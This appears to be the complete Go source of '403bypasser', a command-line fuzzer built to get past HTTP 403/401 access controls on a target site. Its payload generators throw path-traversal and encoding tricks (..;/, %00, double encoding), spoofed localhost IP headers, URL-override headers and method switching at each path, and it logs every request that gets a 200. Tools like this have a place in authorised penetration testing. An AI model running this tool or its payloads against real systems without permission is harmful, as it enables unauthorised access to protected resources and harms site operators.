package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/spf13/cobra"
)

const DefaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

const (
	ColorGreen  = "\033[92m"
	ColorRed    = "\033[91m"
	ColorYellow = "\033[93m"
	ColorBlue   = "\033[94m"
	ColorPurple = "\033[95m"
	ColorCyan   = "\033[96m"
	ColorReset  = "\033[0m"
)

var (
	targetURL           string
	wordlistPath        string
	cookieString        string
	proxyURL            string
	threads             int
	delay               int
	deepMode            bool
	customHeaders       []string

	fileMutex           sync.Mutex
	printLock           sync.Mutex
	calibrationSize404  int
	calibrationSizeRoot int
)

func main() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

var rootCmd = &cobra.Command{
	Use:   "403bypasser",
	Short: "Advanced 403/401 Bypasser & Access Control Fuzzer",
	Run: func(cmd *cobra.Command, args []string) {
		fmt.Println("\033[36m" + `
██╗  ██╗ ██████╗ ██████╗   ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗███████╗██████╗ 
██║  ██║██╔═████╗╚════██╗  ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗
███████║██║██╔██║ █████╔╝  ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗█████╗  ██████╔╝
╚════██║████╔╝██║ ╚═══██╗  ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║██╔══╝  ██╔══██╗
     ██║╚██████╔╝██████╔╝  ██████╔╝   ██║   ██║     ██║  ██║███████║███████║███████╗██║  ██║
     ╚═╝ ╚═════╝ ╚═════╝   ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
` + "\033[0m")
		fmt.Println("    \033[32mv1.0 | Advanced 403/401 Bypasser & Access Control Fuzzer\033[0m\n")

		if targetURL == "" {
			cmd.Help()
			return
		}
		startScan()
	},
}

func init() {
	rootCmd.Flags().StringVarP(&targetURL, "url", "u", "", "Target URL (Required)")
	rootCmd.Flags().StringVarP(&wordlistPath, "wordlist", "w", "", "Path to wordlist file (Optional)")
	rootCmd.Flags().StringVarP(&cookieString, "cookie", "c", "", "Raw session cookie (e.g., 'JSESSIONID=xxx')")
	rootCmd.Flags().StringVarP(&proxyURL, "proxy", "", "", "Proxy URL (e.g. http://127.0.0.1:8080)")
	rootCmd.Flags().IntVarP(&threads, "threads", "t", 10, "Number of concurrent threads")
	rootCmd.Flags().IntVarP(&delay, "delay", "", 0, "Delay between requests in milliseconds (ms)")
	rootCmd.Flags().BoolVarP(&deepMode, "deep", "", false, "Enable Deep Scan Mode (Nested Fuzzing)")
	rootCmd.Flags().StringSliceVarP(&customHeaders, "header", "H", []string{}, "Custom Header (e.g. -H 'Auth: Bearer 123')")
}

func startScan() {
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		fmt.Printf("%s[!] ERROR: Missing URL protocol! Please add 'http://' or 'https://'.\n", ColorRed)
		fmt.Printf("[!] Example: -u https://target.com%s\n", ColorReset)
		os.Exit(1)
	}

	customHeadersMap := make(map[string]string)
	for _, h := range customHeaders {
		parts := strings.SplitN(h, ":", 2)
		if len(parts) == 2 {
			customHeadersMap[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
		}
	}

	baseURL := strings.TrimRight(targetURL, "/")

	finalWordlistPath := wordlistPath
	if finalWordlistPath == "" {
		finalWordlistPath = "wordlists/common.txt"
		if _, err := os.Stat(finalWordlistPath); os.IsNotExist(err) {
			fmt.Printf("%s[!] Error: Default wordlist not found at %s\n", ColorRed, finalWordlistPath)
			fmt.Printf("[i] Please provide a wordlist path with -w.%s\n", ColorReset)
			os.Exit(1)
		}
		fmt.Printf("%s[*] No wordlist provided. Using default: %s%s\n", ColorCyan, finalWordlistPath, ColorReset)
	}

	file, err := os.Open(finalWordlistPath)
	if err != nil {
		fmt.Printf("%s[!] Wordlist Error: %v%s\n", ColorRed, err, ColorReset)
		os.Exit(1)
	}
	defer file.Close()

	var directories []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		directories = append(directories, scanner.Text())
	}

	var transport *http.Transport
	if proxyURL != "" {
		parsedProxyURL, err := url.Parse(proxyURL)
		if err != nil {
			fmt.Printf("%s[!] Invalid Proxy URL: %v%s\n", ColorRed, err, ColorReset)
			os.Exit(1)
		}
		transport = &http.Transport{
			Proxy:           http.ProxyURL(parsedProxyURL),
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		fmt.Printf("%s[*] Proxy Enabled: %s%s\n", ColorYellow, proxyURL, ColorReset)
	} else {
		transport = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	if _, err := os.Stat("results.txt"); os.IsNotExist(err) {
		saveResult("--- 403Bypasser Scan Results ---")
	}

	fmt.Printf("%s[*] Target: %s\n", ColorYellow, baseURL)
	
	calibrate(client, baseURL, customHeadersMap)

	fmt.Printf("[*] Threads: %d\n", threads)
	if delay > 0 {
		fmt.Printf("[*] Delay: %d ms\n", delay)
	}
	
	mode := "Standard"
	if deepMode {
		mode = "Deep Scan"
	}
	fmt.Printf("[*] Mode: %s\n", mode)
	fmt.Printf("[*] Custom Headers: %d\n", len(customHeadersMap))
	fmt.Printf("[*] Paths to Scan: %d\n", len(directories))
	fmt.Println("------------------------------------------------------------" + ColorReset)

	jobs := make(chan string, len(directories))
	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for dir := range jobs {
				processDirectory(client, baseURL, dir, cookieString, customHeadersMap, deepMode, delay)
			}
		}()
	}

	for _, dir := range directories {
		jobs <- dir
	}
	close(jobs)

	wg.Wait()
	fmt.Printf("\n%s[*] Scan Complete. Results saved to 'results.txt'.%s\n", ColorGreen, ColorReset)
}

func saveResult(result string) {
	fileMutex.Lock()
	defer fileMutex.Unlock()

	f, err := os.OpenFile("results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()

	if _, err := f.WriteString(result + "\n"); err != nil {
		return
	}
}

func calibrate(client *http.Client, baseURL string, customHeaders map[string]string) {
	fmt.Println(ColorYellow + "[*] Starting Calibration..." + ColorReset)

	randomURL := baseURL + "/calibration_check_random_string_xyz_999"
	req404, _ := http.NewRequest("GET", randomURL, nil)
	req404.Header.Set("User-Agent", DefaultUserAgent)
	
	for k, v := range customHeaders {
		req404.Header.Set(k, v)
	}
	
	resp404, err := client.Do(req404)
	if err == nil {
		bodyBytes, _ := io.ReadAll(resp404.Body)
		calibrationSize404 = len(bodyBytes)
		resp404.Body.Close()
		fmt.Printf("[i] 404 (Not Found) Calibration Size: ~%d bytes\n", calibrationSize404)
	}

	reqRoot, _ := http.NewRequest("GET", baseURL+"/", nil)
	reqRoot.Header.Set("User-Agent", DefaultUserAgent)
	
	for k, v := range customHeaders {
		reqRoot.Header.Set(k, v)
	}

	respRoot, err := client.Do(reqRoot)
	if err == nil {
		bodyBytes, _ := io.ReadAll(respRoot.Body)
		calibrationSizeRoot = len(bodyBytes)
		respRoot.Body.Close()
		fmt.Printf("[i] Root (Homepage) Calibration Size: ~%d bytes\n", calibrationSizeRoot)
	}

	fmt.Printf("[i] Anti-False Positive Active: Hiding responses within +/- 100 bytes of calibration data.%s\n", ColorReset)
	fmt.Println("------------------------------------------------------------")
}

func generateHeaders(targetPath string) []map[string]string {
	var headersList []map[string]string

	ipHeaders := []string{
		"X-Originating-IP", "X-Forwarded-For", "X-Remote-IP", "X-Client-IP",
		"X-Host", "X-Custom-IP-Authorization", "X-Real-IP", "X-Forwarded-Host",
		"X-Forwarded-Server", "Client-IP", "True-Client-IP", "Fastly-Client-Ip",
		"X-Wap-Profile",
	}
	ipValues := []string{"127.0.0.1", "localhost", "::1", "0.0.0.0", "192.168.1.1", "10.0.0.1"}

	for _, key := range ipHeaders {
		for _, ip := range ipValues {
			headersList = append(headersList, map[string]string{key: ip})
		}
	}

	overrideHeaders := []string{"X-Original-URL", "X-Rewrite-URL", "X-Forwarded-URL", "X-Forwarded-Scheme"}
	for _, key := range overrideHeaders {
		headersList = append(headersList, map[string]string{key: targetPath})
	}

	headersList = append(headersList, map[string]string{"Request-Uri": "127.0.0.1"})
	headersList = append(headersList, map[string]string{"Request-Uri": "localhost"})
	headersList = append(headersList, map[string]string{"Request-Uri": targetPath})

	headersList = append(headersList, map[string]string{"Referer": targetPath})
	headersList = append(headersList, map[string]string{"Referer": "https://localhost"})
	headersList = append(headersList, map[string]string{"Referer": "http://127.0.0.1"})
	headersList = append(headersList, map[string]string{"Referer": "https://127.0.0.1"})
	headersList = append(headersList, map[string]string{"Referer": "http://localhost/" + targetPath})
	
	headersList = append(headersList, map[string]string{"Range": "bytes=0-"})
	headersList = append(headersList, map[string]string{"X-HTTP-Method-Override": "POST"})

	return headersList
}

func urlEncode(str string) string {
	return url.PathEscape(str)
}

func generatePathPayloads(originalPath string) []string {
	cleanPath := strings.Trim(originalPath, "/")
	encodedPath := urlEncode(cleanPath)
	doubleEncoded := urlEncode(encodedPath)

	payloads := []string{
		fmt.Sprintf("/%s", cleanPath),
		fmt.Sprintf("/%s/", cleanPath),
		fmt.Sprintf("/%s/.", cleanPath),
		fmt.Sprintf("//%s//", cleanPath),
		fmt.Sprintf("/./%s/./", cleanPath),
		fmt.Sprintf("///%s", cleanPath),
		fmt.Sprintf("/%s//", cleanPath),

		fmt.Sprintf("/%s%%20", cleanPath),
		fmt.Sprintf("/%s%%09", cleanPath),
		fmt.Sprintf("/%%09/%s", cleanPath),
		fmt.Sprintf("/%s%%00", cleanPath),
		fmt.Sprintf("/%s%%0d", cleanPath),
		fmt.Sprintf("/%s%%0a", cleanPath),
		fmt.Sprintf("/%s%%23", cleanPath),
		fmt.Sprintf("/%s%%3f", cleanPath),

		fmt.Sprintf("/%s;", cleanPath),
		fmt.Sprintf("/%s;/", cleanPath),
		fmt.Sprintf("/%s;.", cleanPath),
		fmt.Sprintf("/;%s", cleanPath),
		fmt.Sprintf("/;/%s", cleanPath),
		fmt.Sprintf("/%s;/;", cleanPath),
		fmt.Sprintf("/%s;x", cleanPath),
		fmt.Sprintf("/%s;x/", cleanPath),
		fmt.Sprintf("/%s;?", cleanPath),
		fmt.Sprintf("/%s;;", cleanPath),

		fmt.Sprintf("/%s/..;/", cleanPath),
		fmt.Sprintf("/%s/..;/;", cleanPath),
		fmt.Sprintf("/admin/..;/%s", cleanPath),
		fmt.Sprintf("/%s/../", cleanPath),
		fmt.Sprintf("/%s/..%%00/", cleanPath),
		fmt.Sprintf("/%s/..%%0d/", cleanPath),
		fmt.Sprintf("/%s/..%%3b/", cleanPath),

		fmt.Sprintf("/%%2e/%s", cleanPath),
		fmt.Sprintf("/%s/%%2e", cleanPath),
		fmt.Sprintf("/%%2f%s", cleanPath),
		fmt.Sprintf("/%s%%2f", cleanPath),

		fmt.Sprintf("/%s", encodedPath),
		fmt.Sprintf("/%s", doubleEncoded),
		fmt.Sprintf("/%%252e/%s", cleanPath),
		fmt.Sprintf("/%%252f%s", cleanPath),

		fmt.Sprintf("/%s.json", cleanPath),
		fmt.Sprintf("/%s.html", cleanPath),
		fmt.Sprintf("/%s.php", cleanPath),
		fmt.Sprintf("/%s;.css", cleanPath),
		fmt.Sprintf("/%s;.js", cleanPath),

		fmt.Sprintf("/%s?", cleanPath),
		fmt.Sprintf("/%s#", cleanPath),
	}

	return payloads
}

func sendRequest(client *http.Client, targetURL string, cookies string, headers map[string]string, customHeaders map[string]string, method, label string) {
	req, err := http.NewRequest(method, targetURL, nil)
	if err != nil {
		return
	}

	if cookies != "" {
		req.Header.Set("Cookie", cookies)
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	for k, v := range customHeaders {
		if strings.EqualFold(k, "Host") {
			req.Host = v
		} else {
			req.Header.Set(k, v)
		}
	}

	req.Header.Set("User-Agent", DefaultUserAgent)

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}
	size := len(bodyBytes)
	status := resp.StatusCode

	diff404 := int(math.Abs(float64(size - calibrationSize404)))
	diffRoot := int(math.Abs(float64(size - calibrationSizeRoot)))
	isFalsePositive := diff404 < 100 || diffRoot < 100

	if status == 200 && !isFalsePositive && size > 0 {
		logMessage := fmt.Sprintf("[+] FOUND (200) | %s | %s | URL: %s | Size: %d", method, label, targetURL, size)
		
		printLock.Lock()
		fmt.Printf("%s%s%s\n", ColorGreen, logMessage, ColorReset)
		printLock.Unlock()

		saveResult(logMessage)
	}
}

func processDirectory(client *http.Client, baseURL, directory, cookies string, customHeaders map[string]string, deepMode bool, delay int) {
	directory = strings.TrimSpace(directory)
	if directory == "" {
		return
	}

	cleanDir := strings.TrimLeft(directory, "/")
	fullPathSuffix := "/" + cleanDir

	pathPayloads := generatePathPayloads(directory)
	headersList := generateHeaders(fullPathSuffix)

	applyDelay := func() {
		if delay > 0 {
			time.Sleep(time.Duration(delay) * time.Millisecond)
		}
	}

	if deepMode {
		for _, path := range pathPayloads {
			target := baseURL + path
			for _, header := range headersList {
				applyDelay()
				
				var headerKey string
				for k := range header {
					headerKey = k
					break
				}
				sendRequest(client, target, cookies, header, customHeaders, "GET", "Hdr:"+headerKey)
				sendRequest(client, target, cookies, header, customHeaders, "POST", "Hdr:"+headerKey)
			}
		}
	} else {
		for _, path := range pathPayloads {
			target := baseURL + path
			
			applyDelay()
			sendRequest(client, target, cookies, nil, customHeaders, "GET", "Path Fuzz")
			
			applyDelay()
			sendRequest(client, target, cookies, nil, customHeaders, "POST", "Method:POST")
			
			applyDelay()
			sendRequest(client, target, cookies, nil, customHeaders, "TRACE", "Method:TRACE")
		}

		target := baseURL + fullPathSuffix
		for _, header := range headersList {
			applyDelay()
			var headerKey string
			for k := range header {
				headerKey = k
				break
			}
			sendRequest(client, target, cookies, header, customHeaders, "GET", "Hdr:"+headerKey)
		}
	}
}